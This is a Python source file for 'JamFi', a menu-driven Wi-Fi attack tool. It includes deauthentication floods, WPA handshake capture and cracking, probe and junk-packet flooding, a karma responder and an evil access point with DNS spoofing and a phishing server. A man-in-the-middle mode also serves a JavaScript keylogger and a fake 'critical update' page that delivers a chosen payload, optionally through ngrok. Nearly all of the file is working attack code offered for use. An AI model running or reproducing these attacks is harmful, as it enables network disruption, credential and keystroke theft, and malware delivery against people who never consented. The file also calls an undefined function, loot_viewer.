#!/usr/bin/env python3
import os
import sys
import time
import subprocess
from scapy.all import *
from threading import Thread
from random import choice, randint
from http.server import BaseHTTPRequestHandler, SimpleHTTPRequestHandler, HTTPServer

if not os.path.isdir("loot"):
    print("📁 Missing loot folder. Creating it now.")
    os.makedirs("loot", exist_ok=True)

def require_root():
    if os.geteuid() != 0:
        print("⚠️ Jam_Fi must be run as root.")
        sys.exit(1)

def cleanup_services(iface=None):
    """Stop network services and flush iptables."""
    for cmd in [
        "pkill -f hostapd",
        "pkill -f dnsmasq",
        "pkill -f dnsspoof",
        "pkill -f phish_server.py",
        "iptables -t nat -F",
    ]:
        subprocess.run(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if iface:
        subprocess.run(["ip", "link", "set", iface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "addr", "flush", "dev", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

seen_aps = {}
clients = {}
scan_results = {}

vendor_prefixes = [
    "00:11:22", "00:0C:29", "D8:96:95", "F4:5C:89", "3C:5A:B4",
    "B8:27:EB", "8C:85:90", "40:B0:34", "A4:5E:60", "E0:3F:49"
]

def print_banner():
    print(r"""
     ██╗ █████╗ ███╗   ███╗        ███████╗██╗
     ██║██╔══██╗████╗ ████║        ██╔════╝██║
     ██║███████║██╔████╔██║        █████╗  ██║
██   ██║██╔══██║██║╚██╔╝██║        ██╔══╝  ██║
╚█████╔╝██║  ██║██║ ╚═╝ ██║███████╗██║     ██║
 ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝
        💜  JamFi Wi-Fi Chaos Tool  💜
              by ekoms savior
""")

def channel_hopper(iface):
    while True:
        for ch in range(1, 14):
            subprocess.run(["iwconfig", iface, "channel", str(ch)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.3)

def packet_handler(pkt):
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr3
        ssid = pkt[Dot11Elt].info.decode(errors='ignore') or "<Hidden SSID>"
        if bssid not in seen_aps:
            seen_aps[bssid] = ssid
            scan_results[bssid] = {"ssid": ssid, "clients": []}
            print(f"📶 AP: {ssid:<25} BSSID: {bssid}")
    if pkt.haslayer(Dot11) and pkt.type == 2:
        src = pkt.addr2
        bssid = pkt.addr3
        if bssid in seen_aps and src != bssid and src not in clients:
            clients[src] = bssid
            scan_results[bssid]["clients"].append(src)
            print(f"    💡 Client: {src} -> {seen_aps[bssid]}")

def scan_clients():
    iface = input("💜 Enter monitor mode interface (e.g. wlan0mon): ").strip()
    if not iface:
        print("⚠️ Interface not entered.")
        return
    print("📡 Scanning for clients and APs... (CTRL+C to stop)\n")
    Thread(target=channel_hopper, args=(iface,), daemon=True).start()
    try:
        sniff(iface=iface, prn=packet_handler, store=0)
    except KeyboardInterrupt:
        print("✅ Scan stopped.")

def capture_handshake(iface, bssid):
    path = f"loot/handshake_{bssid.replace(':','')}.pcap"
    print(f"📡 Capturing handshake to {bssid}, saving to {path}")

    def eapol(pkt):
        return pkt.haslayer(EAPOL) and (
            pkt.addr1 == bssid or pkt.addr2 == bssid or pkt.addr3 == bssid
        )

    try:
        pkts = sniff(iface=iface, lfilter=eapol, timeout=10)
        if pkts:
            wrpcap(path, pkts)
            print(f"✅ Saved handshake to {path}")
        else:
            print(f"⚠ No handshake captured for {bssid}")
    except Exception as e:
        print(f"❌ Error sniffing for {bssid}: {e}")

def deauth_attack():
    iface = input(" Monitor mode interface: ").strip()
    target = input(" Target Client MAC: ").strip()
    ap = input(" Access Point MAC: ").strip()
    count = int(input(" Number of packets: ") or 100)
    delay = float(input(" Delay between packets: ") or 0.05)
    capture = input(" Capture handshake? (y/n): ").strip().lower()
    if capture == "y":
        Thread(target=capture_handshake, args=(iface, ap)).start()
        time.sleep(2)
    frame = RadioTap()/Dot11(addr1=target, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
    sendp(frame, iface=iface, count=count, inter=delay)
    print("✅ Deauth complete!")

def deauth_all():
    iface = input(" Monitor mode interface: ").strip()
    if not scan_results:
        print("⚠️ Run scan first!")
        return
    count = int(input(" Number of packets per client (default 100): ") or 100)
    delay = float(input(" Delay between packets (default 0.05): ") or 0.05)
    print("💥 Deauthing all clients and sniffing handshakes...\n")

    for bssid, data in scan_results.items():
        # 🔐 Sequential handshake capture to avoid socket overload
        print(f"📡 Sniffing handshake for {bssid} ({seen_aps.get(bssid, 'Unknown')})...")
        capture_handshake(iface, bssid)

        for client in data["clients"]:
            try:
                frame = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                sendp(frame, iface=iface, count=count, inter=delay, verbose=0)
                print(f"🚀 Deauthed {client} from {seen_aps.get(bssid, 'Unknown')}")
            except OSError as e:
                print(f"❌ Error sending deauth to {client}: {e}")

def crack_handshakes():
    print(" Crack Captured Handshakes")
    loot_dir = "loot"
    pcaps = [f for f in os.listdir(loot_dir) if f.endswith(".pcap")]
    if not pcaps:
        print("⚠️ No .pcap handshake files found in loot/")
        return

    print("\n📁 Available Handshakes:")
    for i, p in enumerate(pcaps):
        print(f"{i+1}. {p}")
    choice = input(" Choose a handshake file to crack: ").strip()
    if not choice.isdigit() or int(choice) < 1 or int(choice) > len(pcaps):
        print("⚠️ Invalid selection.")
        return
    pcap_file = os.path.join(loot_dir, pcaps[int(choice)-1])
    
    method = input(" Crack with (1) Aircrack-ng or (2) Hashcat? [1/2]: ").strip()
    wordlist = input(" Wordlist path (default: /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
    
    if method == "1":
        print(" Launching Aircrack-ng...")
        subprocess.run(["aircrack-ng", pcap_file, "-w", wordlist])
    elif method == "2":
        hccapx = pcap_file.replace(".pcap", ".hccapx")
        print("🔄 Converting pcap to hccapx...")
        subprocess.run(["cap2hccapx", pcap_file, hccapx])
        print(" Launching Hashcat...")
        subprocess.run(["hashcat", "-m", "2500", hccapx, wordlist, "--force"])
    else:
        print("⚠️ Invalid choice.")

def probe_spammer(iface=None):
    if iface is None:
        iface = input(" Enter monitor mode interface (e.g. wlan0mon): ").strip()
    ssids = ["FreeWiFi", "Starbucks", "McDonald's", "Xfinity", "SchoolWiFi", "UnicornNet"]
    print("📡 Spamming probe requests...")
    while True:
        for ssid in ssids:
            pkt = RadioTap()/Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff",
                addr2=RandMAC(), addr3=RandMAC())/Dot11ProbeReq()/Dot11Elt(ID=0, info=ssid)
            sendp(pkt, iface=iface, verbose=0)
        time.sleep(0.2)

def junk_flood(iface=None):
    if iface is None:
        iface = input(" Enter monitor mode interface (e.g. wlan0mon): ").strip()
    print("💣 Sending junk packets...")
    while True:
        pkt = RadioTap()/Dot11(addr1=RandMAC(), addr2=RandMAC(), addr3=RandMAC())/Raw(load=os.urandom(50))
        sendp(pkt, iface=iface, verbose=0)

def karma_responder(iface=None):
    if iface is None:
        iface = input(" Monitor mode interface (e.g. wlan0mon): ").strip()
    print("🧲 Karma responder: answering all probe requests...")
    def handle(pkt):
        if pkt.haslayer(Dot11ProbeReq) and pkt.haslayer(Dot11Elt):
            ssid = pkt[Dot11Elt].info.decode(errors='ignore') or "FreeWiFi"
            resp = RadioTap()/Dot11(type=0, subtype=8, addr1=pkt.addr2,
                addr2=RandMAC(), addr3=RandMAC())/Dot11Beacon(cap="ESS")/Dot11Elt(ID=0, info=ssid)
            sendp(resp, iface=iface, verbose=0)
            print(f"✨ Responded to probe for: {ssid}")
    sniff(iface=iface, prn=handle)

def chaos_mode():
    print("💃 Chaos Mode Engaged!")
    iface = input(" Enter monitor mode interface (e.g. wlan0mon): ").strip()
    if not iface:
        print("⚠️ Interface not entered.")
        return
    Thread(target=probe_spammer, args=(iface,), daemon=True).start()
    Thread(target=junk_flood, args=(iface,), daemon=True).start()
    Thread(target=karma_responder, args=(iface,), daemon=True).start()

def evil_ap_mode():
    print("👿 Starting Fully Connectable Evil AP Mode...")

    iface = input("💜 Interface (e.g. wlan0): ").strip()
    ssid = input("💜 SSID to broadcast (e.g. Free_Public_WiFi): ").strip()

    os.makedirs("loot", exist_ok=True)

    print("🧹 Cleaning up old services...")
    cleanup_services(iface)

    print("🌐 Configuring network interface...")
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"])
    subprocess.run(["sudo", "ip", "addr", "flush", "dev", iface])
    subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", iface])
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"])

    hostapd_conf = f"""
interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
    """.strip()

    with open("loot/hostapd.conf", "w") as f:
        f.write(hostapd_conf)

    dnsmasq_conf = f"""
interface={iface}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
    """.strip()

    with open("loot/dnsmasq.conf", "w") as f:
        f.write(dnsmasq_conf)

    # Start services
    print(f"📶 Starting Evil AP on {iface} with SSID: {ssid}")
    subprocess.Popen(["sudo", "hostapd", "loot/hostapd.conf"])
    time.sleep(2)

    print("🧠 Launching dnsmasq...")
    subprocess.Popen(["sudo", "dnsmasq", "-C", "loot/dnsmasq.conf"])

    print("💻 Hosting phishing login at http://10.0.0.1 ...")
    subprocess.Popen(["sudo", "python3", "phish_server.py"])

    print("🔀 Enabling HTTP redirection with iptables...")
    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"])
    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"])
    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"])

    print("🎯 Launching dnsspoof to redirect all DNS to 10.0.0.1")
    with open("loot/dnsspoof_hosts", "w") as f:
        f.write("10.0.0.1 *\n")
    subprocess.Popen(["sudo", "dnsspoof", "-i", iface, "-f", "loot/dnsspoof_hosts"])

    print("Press CTRL+C to stop Evil AP.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("🛑 Evil AP stopped.")
    finally:
        cleanup_services(iface)

def mitm_hid_injection():
    import datetime
    import shutil
    import requests
    import subprocess
    from http.server import BaseHTTPRequestHandler, HTTPServer

    print("🧠 Starting MITM HID Injection Mode...")
    iface = input("💜 Interface (e.g. wlan0): ").strip()
    ssid = input("💜 SSID clients think they’re connecting to: ").strip()
    fake = input("💜 Fake SSID to broadcast: ").strip()

    use_ngrok = input("🌍 Use Ngrok for remote access? (y/n): ").strip().lower() == "y"

    os.makedirs("loot", exist_ok=True)
    os.makedirs("payloads", exist_ok=True)

    # 📦 Payload selector
    print("\n📦 Available Payloads in /payloads:")
    payload_files = [f for f in os.listdir("payloads") if os.path.isfile(os.path.join("payloads", f))]
    for i, f in enumerate(payload_files):
        print(f"{i+1}) {f}")
    print("0) None")
    choice = input("💜 Choose payload: ").strip()
    selected_payload = None
    if choice.isdigit() and int(choice) in range(1, len(payload_files)+1):
        selected_payload = payload_files[int(choice)-1]
        shutil.copyfile(f"payloads/{selected_payload}", f"loot/{selected_payload}")

    # 📝 Log files
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M")
    session_log = f"session_log_{timestamp}.txt"
    keystroke_log = f"keystroke_log_{timestamp}.txt"

    # 🌐 Set up network
    cleanup_services(iface)
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"])
    subprocess.run(["sudo", "ip", "addr", "flush", "dev", iface])
    subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", iface])
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"])

    with open("loot/hostapd.conf", "w") as f:
        f.write(f"""
interface={iface}
driver=nl80211
ssid={fake}
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
""".strip())

    with open("loot/dnsmasq.conf", "w") as f:
        f.write(f"""
interface={iface}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
""".strip())

    # 🌐 Start Ngrok if requested
    public_url = "http://10.0.0.1"
    if use_ngrok:
        print("🚀 Launching Ngrok tunnel on port 80...")
        subprocess.Popen(["./ngrok", "http", "80"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)
        try:
            res = requests.get("http://localhost:4040/api/tunnels")
            public_url = res.json()["tunnels"][0]["public_url"]
            print(f"🌍 Ngrok Public URL: {public_url}")
        except:
            print("❌ Failed to get Ngrok URL. Falling back to local IP.")

    # 🧠 JS Keylogger + redirect
    with open("loot/injection.html", "w") as f:
        f.write(f"""<html><body>
<h2>Welcome to {ssid}</h2>
<form><input id="input" type="text" placeholder="Loading..." autofocus></form>
<iframe src="{public_url}/track" style="display:none;" width="1" height="1"></iframe>
<script>
document.getElementById("input").addEventListener("keydown", function(e) {{
    fetch('/log_key?key=' + encodeURIComponent(e.key));
}});
setTimeout(() => {{
    window.location.href = "{public_url}/fake_update.html";
}}, 4000);
</script></body></html>""")

    # 🔽 Fake Update Page
    with open("loot/fake_update.html", "w") as f:
        if selected_payload:
            f.write(f"""<html><body>
<h1>System Update</h1>
<p>Click to install critical update.</p>
<a href="{public_url}/{selected_payload}" download><button>Download {selected_payload}</button></a>
</body></html>""")
        else:
            f.write("<html><body><h1>No Update Required</h1></body></html>")

    with open("loot/dnsspoof_hosts", "w") as f:
        f.write("10.0.0.1 *\n")

    # ✅ Serve from loot/
    os.chdir("loot")
    open(session_log, "a").close()
    open(keystroke_log, "a").close()

    print(f"📶 Broadcasting SSID: {fake}")
    subprocess.Popen(["sudo", "hostapd", "hostapd.conf"])
    time.sleep(2)
    subprocess.Popen(["sudo", "dnsmasq", "-C", "dnsmasq.conf"])
    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"])
    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"])
    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"])
    subprocess.Popen(["sudo", "dnsspoof", "-i", iface, "-f", "dnsspoof_hosts"])

    class HIDHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            ua = self.headers.get("User-Agent", "unknown")
            ip = self.client_address[0]
            with open(session_log, "a") as f:
                f.write(f"[{datetime.datetime.now()}] IP: {ip} | UA: {ua} | Path: {self.path}\n")

            if self.path.startswith("/log_key"):
                key = self.path.split("key=")[-1]
                with open(keystroke_log, "a") as f:
                    f.write(f"[{datetime.datetime.now()}] {ip} pressed: {key}\n")
                self.send_response(204)
                self.end_headers()
            elif self.path == "/" or self.path == "/index.html":
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                with open("injection.html", "rb") as f:
                    self.wfile.write(f.read())
            elif self.path == "/fake_update.html":
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                with open("fake_update.html", "rb") as f:
                    self.wfile.write(f.read())
            elif selected_payload and self.path == f"/{selected_payload}":
                self.send_response(200)
                self.send_header('Content-Disposition', f'attachment; filename="{selected_payload}"')
                self.send_header('Content-type', 'application/octet-stream')
                self.end_headers()
                with open(selected_payload, "rb") as f:
                    self.wfile.write(f.read())
            elif self.path == "/track":
                self.send_response(200)
                self.send_header("Content-type", "image/gif")
                self.end_headers()
                self.wfile.write(b"GIF89a")
            else:
                self.send_error(404)

        def log_message(self, format, *args):
            return

    print("💻 Serving fake pages on http://10.0.0.1 ...")
    try:
        HTTPServer(("0.0.0.0", 80), HIDHandler).serve_forever()
    except KeyboardInterrupt:
        print("🛑 Server stopped.")
    finally:
        cleanup_services(iface)

def main():
    print_banner()
    while True:
        print("\n🔹 1️⃣  Scan Clients & APs 🔍")
        print("🔹 2️⃣  Deauth One Client 💥")
        print("🔹 3️⃣  Deauth ALL Clients + Capture 🔓")
        print("🔹 4️⃣  Crack Captured Handshakes 🔓")
        print("🔹 5️⃣  Probe Request Spam 📡")
        print("🔹 6️⃣  Junk Packet Flood 💣")
        print("🔹 7️⃣  Karma Responder 🧲")
        print("🔹 8️⃣  Chaos Mode 💃")
        print("🔹 9️⃣  View Loot 📁")
        print("🔹 🔟  Evil AP 👿")
        print("🔹 11️⃣ MITM HID Injection 🧠")
        print("🔹 0️⃣  Quit ❌")
        choice = input("💜 Choose an option: ").strip()

        if choice == "1": scan_clients()
        elif choice == "2": deauth_attack()
        elif choice == "3": deauth_all()
        elif choice == "4": crack_handshakes()
        elif choice == "5": probe_spammer()
        elif choice == "6": junk_flood()
        elif choice == "7": karma_responder()
        elif choice == "8": chaos_mode()
        elif choice == "9": loot_viewer()
        elif choice == "10": evil_ap_mode()
        elif choice == "11": mitm_hid_injection()
        elif choice == "0":
            print("👋 Goodbye fren! XOXOXO 💜")
            cleanup_services()
            sys.exit()
        else:
            print("⚠️ Invalid choice!")

if __name__ == "__main__":
    require_root()
    main()

